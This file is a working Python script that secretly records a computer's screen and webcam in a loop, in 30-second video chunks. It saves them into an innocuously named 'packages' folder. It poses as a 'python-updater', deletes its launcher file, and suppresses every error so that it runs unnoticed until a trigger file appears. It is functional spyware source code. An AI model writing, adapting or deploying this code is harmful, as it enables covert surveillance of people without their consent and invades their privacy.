try:
    from os import path, makedirs, remove, system
    from datetime import datetime
    from PIL import ImageGrab
    import numpy as np
    import time
    import cv2

    output_name = "packages"
    output_path = "./" + output_name
    
    if path.exists(f"./python-updater.py.cmd"):
        remove(f"./python-updater.py.cmd")
    
    file_path = "python-updater.py"
    seconds_per_file = 30
    frame_rate = 20.0
    frame_time = 1.0 / frame_rate
    v = {}

    cleanup_path = f"./{output_path}/SAVE.txt"
    if not path.exists(output_path): makedirs(output_path)

    def record_loop():
        start_time = int(time.time())
        date = datetime.today().strftime('%Y-%m-%d')
        
        if not path.exists(f"{output_path}/{date}"): makedirs(f"{output_path}/{date}")
        camera_output = f"{output_path}/{date}/camera_{start_time}.mp4"
        video_output = f"{output_path}/{date}/screen_{start_time}.mp4"
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')

        screen_size = ImageGrab.grab().size
        v["video_writer"] = cv2.VideoWriter(
            video_output,
            fourcc,
            frame_rate,
            screen_size
        )

        v["camera"] = cv2.VideoCapture(0)
        cam_size = (int(v["camera"].get(cv2.CAP_PROP_FRAME_WIDTH)), int(v["camera"].get(cv2.CAP_PROP_FRAME_HEIGHT)))
        v["camera_writer"] = cv2.VideoWriter(
            camera_output,
            fourcc,
            frame_rate,
            cam_size
        )

        try:
            while True:
                try:
                    if round(time.time()) >= round(start_time + seconds_per_file):
                        break
                    if path.exists(cleanup_path):
                        break

                    v["video_writer"].write(cv2.cvtColor(
                        np.array(
                            ImageGrab.grab()
                        ),
                        cv2.COLOR_RGB2BGR
                    ))
                    v["camera_writer"].write(
                        v["camera"].read()[1]
                    )
                    cv2.waitKey(1)
                except:
                    pass
        except:
            pass

        for d in v:
            v[d].release()
        cv2.destroyAllWindows()

    while True:
        if path.exists(cleanup_path):
            remove(cleanup_path)
            system("start explorer packages")
        else:
            record_loop()
except:
    pass
